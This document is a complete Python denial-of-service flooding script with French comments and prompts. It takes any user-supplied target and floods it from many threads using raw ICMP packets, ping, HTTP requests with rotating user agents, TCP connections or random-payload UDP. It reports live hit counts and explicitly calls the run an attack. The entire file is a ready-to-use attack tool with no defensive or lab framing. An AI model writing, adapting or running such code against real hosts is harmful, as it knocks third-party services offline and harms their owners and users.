import socket
import struct
import threading
import time
import random
import os
import sys
import subprocess
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor

# Variables globales pour stocker les résultats
results = {'success': 0, 'failed': 0}
stop_flag = False

def checksum(source_string):
    """Calcule le checksum pour un paquet ICMP"""
    count_to = (len(source_string) // 2) * 2
    count = 0
    sum_val = 0
    
    while count < count_to:
        sum_val += (source_string[count+1] * 256 + source_string[count])
        count += 2
        
    if count_to < len(source_string):
        sum_val += ord(source_string[len(source_string) - 1])
        sum_val = sum_val & 0xffffffff
        
    sum_val = (sum_val >> 16) + (sum_val & 0xffff)
    sum_val += (sum_val >> 16)
    answer = ~sum_val
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    
    return answer

def create_packet(packet_id):
    """Crée un paquet ICMP Echo Request"""
    # Header ICMP (type, code, checksum, id, seq)
    header = struct.pack('bbHHh', 8, 0, 0, packet_id, 1)
    
    # Données du paquet
    data = b'abcdefghijklmnopqrstuvwxyz'
    
    # Calcul du checksum
    checksum_val = checksum(header + data)
    
    # Création du paquet final
    header = struct.pack('bbHHh', 8, 0, checksum_val, packet_id, 1)
    
    return header + data

def icmp_flood(ip, packet_id):
    """Envoie des paquets ICMP (ping) vers une adresse IP"""
    try:
        # Création d'un socket raw (nécessite des privilèges admin)
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        # Création du paquet
        packet = create_packet(packet_id)
        
        # Envoi du paquet
        s.sendto(packet, (ip, 0))
        results['success'] += 1
        
        s.close()
        
    except Exception as e:
        results['failed'] += 1

def tcp_flood(ip, port):
    """Envoie des requêtes TCP vers une adresse IP et un port"""
    try:
        # Création d'un socket TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)  # Timeout de 1 seconde
        
        # Tentative de connexion
        result = s.connect_ex((ip, port))
        
        if result == 0:
            results['success'] += 1
        else:
            results['failed'] += 1
            
        s.close()
        
    except Exception as e:
        results['failed'] += 1

def udp_flood(ip, port, packet_size):
    """Envoie des paquets UDP vers une adresse IP et un port"""
    try:
        # Création d'un socket UDP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Génération de données aléatoires
        data = random._urandom(packet_size)
        
        # Envoi du paquet
        s.sendto(data, (ip, port))
        results['success'] += 1
        
        s.close()
        
    except Exception as e:
        results['failed'] += 1

def ping_command(ip, count):
    """Utilise la commande ping du système"""
    try:
        # Commande ping selon l'OS
        if sys.platform == 'win32':
            command = ['ping', '-n', str(count), ip]
        else:
            command = ['ping', '-c', str(count), ip]
        
        # Exécution de la commande
        output = subprocess.run(command, capture_output=True, text=True, timeout=5)
        
        # Analyse des résultats
        if output.returncode == 0:
            results['success'] += count
        else:
            results['failed'] += count
            
    except Exception as e:
        results['failed'] += count

def http_flood(url):
    """Envoie des requêtes HTTP vers une URL"""
    try:
        # Création d'une requête avec un user-agent aléatoire
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        
        req = urllib.request.Request(url)
        req.add_header('User-Agent', random.choice(user_agents))
        
        # Envoi de la requête
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                results['success'] += 1
            else:
                results['failed'] += 1
        
    except Exception as e:
        results['failed'] += 1

def worker_function(ip, method, port=None, packet_size=1024, url=None):
    """Fonction de travail pour les threads"""
    packet_id = random.randint(1, 65535)
    
    while not stop_flag:
        if method == "icmp":
            icmp_flood(ip, packet_id)
            packet_id = (packet_id + 1) % 65535
        elif method == "tcp":
            tcp_flood(ip, port)
        elif method == "udp":
            udp_flood(ip, port, packet_size)
        elif method == "ping":
            ping_command(ip, 1)
        elif method == "http":
            http_flood(url)

def test_method(ip, method, port=None, url=None):
    """Teste si une méthode fonctionne"""
    test_results = {'success': 0, 'failed': 0}
    
    if method == "icmp":
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.close()
            return True
        except:
            return False
    elif method == "ping":
        try:
            if sys.platform == 'win32':
                command = ['ping', '-n', '1', ip]
            else:
                command = ['ping', '-c', '1', ip]
            output = subprocess.run(command, capture_output=True, text=True, timeout=5)
            return output.returncode == 0
        except:
            return False
    elif method == "http":
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=5) as response:
                return response.status == 200
        except:
            return False
    else:
        # TCP et UDP sont généralement disponibles
        return True

def main():
    global stop_flag, results
    
    # Paramètres
    ip_address = input("Entrez l'adresse IP ou le domaine à cibler: ")
    thread_count = int(input("Nombre de threads simultanés: "))
    duration = int(input("Durée en secondes: "))
    
    # Résolution du nom de domaine si nécessaire
    try:
        ip = socket.gethostbyname(ip_address)
        if ip != ip_address:
            print(f"Adresse IP résolue: {ip}")
            ip_address = ip
    except:
        print("Impossible de résoudre le nom de domaine, utilisation de l'adresse fournie.")
    
    # Détection des méthodes disponibles
    available_methods = []
    
    print("\nDétection des méthodes disponibles...")
    
    # Test ICMP
    if test_method(ip_address, "icmp"):
        available_methods.append("icmp")
        print("✓ ICMP (sockets bruts) disponible")
    else:
        print("✗ ICMP (sockets bruts) non disponible (nécessite des privilèges admin)")
    
    # Test ping
    if test_method(ip_address, "ping"):
        available_methods.append("ping")
        print("✓ Commande ping disponible")
    else:
        print("✗ Commande ping non disponible")
    
    # Test HTTP
    url_http = f"http://{ip_address}/"
    if test_method(ip_address, "http", url=url_http):
        available_methods.append(("http", url_http))
        print("✓ HTTP disponible")
    else:
        print("✗ HTTP non disponible")
    
    # Test HTTPS
    url_https = f"https://{ip_address}/"
    if test_method(ip_address, "http", url=url_https):
        available_methods.append(("http", url_https))
        print("✓ HTTPS disponible")
    else:
        print("✗ HTTPS non disponible")
    
    # TCP et UDP sont généralement disponibles
    available_methods.append("tcp")
    print("✓ TCP disponible")
    available_methods.append("udp")
    print("✓ UDP disponible")
    
    # Choix de la méthode
    if len(available_methods) > 1:
        print("\nMéthodes disponibles:")
        for i, method in enumerate(available_methods):
            if isinstance(method, tuple):
                print(f"{i+1}. {method[0]} ({method[1]})")
            else:
                print(f"{i+1}. {method}")
        
        choice = input("Choisissez une méthode (numéro) ou appuyez sur Entrée pour la meilleure: ")
        
        if choice.isdigit() and 1 <= int(choice) <= len(available_methods):
            selected_method = available_methods[int(choice)-1]
        else:
            # Sélection automatique de la meilleure méthode
            if "icmp" in available_methods:
                selected_method = "icmp"
            elif "ping" in available_methods:
                selected_method = "ping"
            elif any(isinstance(m, tuple) and m[0] == "http" for m in available_methods):
                selected_method = next(m for m in available_methods if isinstance(m, tuple) and m[0] == "http")
            else:
                selected_method = "tcp"
    else:
        selected_method = available_methods[0] if available_methods else "tcp"
    
    # Configuration supplémentaire selon la méthode
    port = None
    url = None
    packet_size = 1024
    
    if selected_method == "tcp" or selected_method == "udp":
        port = input("Entrez le port (80 pour HTTP, 443 pour HTTPS, 80 par défaut): ") or "80"
        port = int(port)
        
        if selected_method == "udp":
            packet_size = input("Taille des paquets en octets (1024 par défaut): ") or "1024"
            packet_size = int(packet_size)
    
    # Affichage de la configuration
    print("\n--- Configuration ---")
    print(f"Cible: {ip_address}")
    if isinstance(selected_method, tuple):
        print(f"Méthode: {selected_method[0]}")
        print(f"URL: {selected_method[1]}")
        url = selected_method[1]
        method = selected_method[0]
    else:
        print(f"Méthode: {selected_method}")
        method = selected_method
    
    if port:
        print(f"Port: {port}")
    if packet_size != 1024:
        print(f"Taille des paquets: {packet_size}")
    
    print(f"Threads: {thread_count}")
    print(f"Durée: {duration} secondes")
    print("----------------------\n")
    
    # Démarrage de l'attaque
    print(f"Démarrage de l'attaque...")
    
    start_time = time.time()
    
    # Création d'un pool de threads
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        # Démarrage des threads de travail
        futures = []
        for _ in range(thread_count):
            if isinstance(selected_method, tuple):
                future = executor.submit(worker_function, ip_address, selected_method[0], 
                                         port=port, packet_size=packet_size, url=selected_method[1])
            else:
                future = executor.submit(worker_function, ip_address, selected_method, 
                                         port=port, packet_size=packet_size, url=url)
            futures.append(future)
        
        # Surveillance pendant la durée spécifiée
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            print(f"Temps écoulé: {elapsed:.2f}s | Succès: {results['success']} | Échecs: {results['failed']}")
            time.sleep(1)
        
        # Arrêt des threads
        stop_flag = True
        
        # Attente de la fin des threads
        for future in futures:
            future.result()
    
    total_requests = results['success'] + results['failed']
    success_rate = (results['success'] / total_requests * 100) if total_requests > 0 else 0
    
    print("\n--- Statistiques finales ---")
    print(f"Requêtes totales: {total_requests}")
    print(f"Succès: {results['success']} ({success_rate:.2f}%)")
    print(f"Échecs: {results['failed']} ({100-success_rate:.2f}%)")
    print(f"Durée totale: {time.time() - start_time:.2f}s")
    
    # Calcul du débit
    elapsed_time = time.time() - start_time
    if elapsed_time > 0:
        requests_per_second = total_requests / elapsed_time
        print(f"Débit moyen: {requests_per_second:.2f} requêtes/seconde")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nArrêt du script...")
        stop_flag = True
        sys.exit(0)
    except Exception as e:
        print(f"\nErreur: {e}")
        sys.exit(1)